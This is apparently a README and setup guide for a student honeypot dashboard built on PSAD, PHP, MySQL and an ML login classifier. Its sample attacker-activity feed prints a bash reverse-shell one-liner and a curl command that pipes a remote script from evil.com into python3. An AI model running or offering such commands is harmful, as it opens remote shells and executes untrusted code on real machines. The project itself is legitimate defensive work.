

---

# 🛡️ Honeypot A CYBER PROJECT Real-Time Dashboard Setup Guide


Our project is a **Honeypot-as-a-Service** platform that **detects, logs, analyzes, visualizes, and classifies real-time cyber attacks** using simulated honeypot services. It's enhanced with **machine learning**, **automated IP blocking**, and a live **real-time dashboard** for security teams to monitor and respond instantly.

> “What antivirus does after a breach, our system does proactively before damage is done.”

---

### 💡 Core Features:

#### 1. 🛡️ **Simulated Honeypot Services**

* Simulates vulnerable SSH, FTP, HTTP ports to **bait attackers**.
* Logs every command and connection attempt.
* Feels like a real service—deceives attackers into interacting.

#### 2. ⚡ **Real-Time Interactive Dashboard**

* Built in HTML + Chart.js + PHP + MySQL (No frameworks).
* Live updates every **5 seconds** with:

  * 📌 **Attack Type Distribution** (Normal vs Suspicious)
  * ⏱️ **Time Series Graph** (Attacks over the last 12 hours)
  * 🔐 **SSH Login Classifier** (Success/Fail attempts)
  * 🚨 **Top IP Scanners** (from PSAD)
  * 📊 **PSAD Summary Metrics** (Blocked IPs, Total Sources)
  * 🛠️ **Port Scan Activity** (Tooltips with timestamp)

#### 3. 🧠 **ML-based Anomaly Detection**

* Every login attempt is classified using an AI model:

  * `Normal` or `Suspicious`
* Judges or admins can review and correct labels.
* Model **re-trains automatically** based on human feedback (active learning).

#### 4. 🔁 **Review & Feedback System**

* Admin panel for:

  * Reviewing unverified login logs.
  * Labeling them with one click (`Normal` / `Suspicious`).
  * System learns from admin input for smarter future classifications.

#### 5. 📡 **Real SSH Monitoring (Non-standard port)**

* Monitors actual login attempts on a real SSH server (e.g., port 2222).
* Logs are parsed and stored into MySQL in real time.


#### 8. 🧑‍💻 **Attacker Activity Feed**

* Table of all commands executed by attackers.
* Shows live logs such as:

  ```bash
  bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
  curl http://evil.com/backdoor.py | python3
  ```

#### 9. 📧 **Gmail Alerts**

* Auto sends email to admin on:

  * Port scan detection

#### 10. 📈 **Fully Auto-Refreshing Interface**

* No manual refresh needed.
* Everything updates seamlessly via fetch + JSON every 5 seconds.


---


### ⚙️ Tech Stack:

| Component          | Stack / Tool                         |
| ------------------ | ------------------------------------ |
| Backend            | PHP                                  |
| Database           | MySQL                                |
| ML Classifier      | Python                               |
| Real-Time Charting | Chart.js                             |
| Honeypot Engine    | Custom Python scripts                |
| Packet Scanner     | PSAD (Port Scan Attack Detector)     |
| Email Alerts       | Gmail SMTP + PHPMailer               |
| Deployment         | VPS / Localhost with Port Forwarding |




## ✅ Requirements

* A Linux VPS (Ubuntu/Debian preferred)
* Apache + PHP (XAMPP or LAMP)
* MySQL or MariaDB
* Python 3 with `pymysql` installed
* `psad` for port scan detection
* `tmux` or `nohup` for background scripts
* `pdo_mysql` enabled in PHP
* `sudo` privileges

---

## 📦 1. Install Python & Required Packages

```bash
sudo apt update
sudo apt install python3-pip
pip3 install pymysql
```

---

## 🔐 2. Real-Time SSH Login Monitoring

### A. Set Log File Path

Edit your Python script (`ssh_log_watcher.py`) and set the correct log file:

```python
LOG_FILE = "/var/log/auth.log"  # For Ubuntu/Debian
# LOG_FILE = "/var/log/secure"   # For CentOS/RHEL
```

### B. Grant Log File Read Access

**Option 1: Add Apache to the `adm` group:**

```bash
sudo usermod -aG adm www-data
sudo chmod +r /var/log/auth.log
```

**Option 2: Run your script as root:**

```bash
sudo python3 ssh_log_watcher.py
```

---

## 🌀 3. Run SSH Monitor Script in Background

### Option A: Use `tmux` (recommended)

```bash
sudo apt install tmux
tmux new -s sshwatcher
python3 ssh_log_watcher.py
# Press Ctrl+B, then D to detach
```

### Option B: Use `nohup`

```bash
nohup python3 ssh_log_watcher.py > ssh_log.txt 2>&1 &
```

---

## ⚡ 4. Install and Configure PSAD

```bash
sudo apt update
sudo apt install psad -y
sudo systemctl enable psad
sudo systemctl start psad
```

### Enable UFW + iptables (required for PSAD to log)

```bash
sudo ufw enable
```

---

## 🔧 5. Allow Apache to Run PSAD (Sudoers)

Open the sudoers file:

```bash
sudo visudo
```

Add this line at the bottom:

```bash
www-data ALL=(ALL) NOPASSWD: /usr/sbin/psad
```

---

## 🧠 6. Deploy PHP Fetch Script for PSAD

### A. Place `fetch_psad_data.php` and `db.php` in:

```
/var/www/html/
```

> `db.php` should contain your MySQL PDO connection configuration.

### B. Test it manually:

```bash
php /var/www/html/fetch_psad_data.php
```

---

## ⏱️ 7. Schedule PSAD Fetching (Cron Job)

```bash
sudo crontab -e
```

Add this line to run every 1 minute:

```bash
* * * * * php /var/www/html/fetch_psad_data.php
```

---

## 🔐 8. Secure SSH Access & Leave Port 22 for Honeypot

### A. Change SSH port to a non-default value (e.g., 8822):

```bash
sudo nano /etc/ssh/sshd_config
```

Update or add:

```
Port 8822
```

Restart SSH:

```bash
sudo systemctl restart ssh
```

Allow new port in firewall:

```bash
sudo ufw allow 8822/tcp
```

### B. Important:

* Keep port **22 open** for attackers — this acts as your honeypot entry point.
* Always test login on new port first:

```bash
ssh user@your-ip -p 8822
```

---

## ✅ Summary

| Component             | Purpose                                |
| --------------------- | -------------------------------------- |
| `ssh_log_watcher.py`  | Tracks and inserts SSH login attempts  |
| `psad`                | Detects port scans & logs scanner data |
| `fetch_psad_data.php` | Parses & logs PSAD output to MySQL     |
| Cron Job              | Ensures continuous data ingestion      |
| Dashboard             | Visualizes live attack behavior        |

---

## 📊 Dashboard Overview

| Chart                        | Data Source             |
| ---------------------------- | ----------------------- |
| Attack Type Distribution     | Analyzed log types      |
| Suspicious Activity Timeline | Time-based login volume |
| SSH Login Status             | Real vs failed logins   |
| Top PSAD Scanners            | Top attacking IPs       |
| PSAD Summary                 | Total sources & blocked |
| Port Scan Activity           | Visual port scan logs   |

---

## 🧪 Testing Tips

* Try logging into port 22 manually to generate fake attacks.
* Use tools like `nmap` to test PSAD detection:

```bash
nmap -sS your-server-ip
```

---

## 🙌 Credits

Project: Honeypot-as-a-Service
Author: Arman Kumar, Himanshu Kumar
Backend: PHP + Python + MySQL + ML
Monitoring Tools: PSAD, Custom Scripts

## 🤖 Author

**Arman Kumar**
Cybersecurity | OSINT | AI Security Projects
[GitHub](https://github.com/armank8000) | [LinkedIn](https://linkedin.com/in/arman-kumar8000)

---
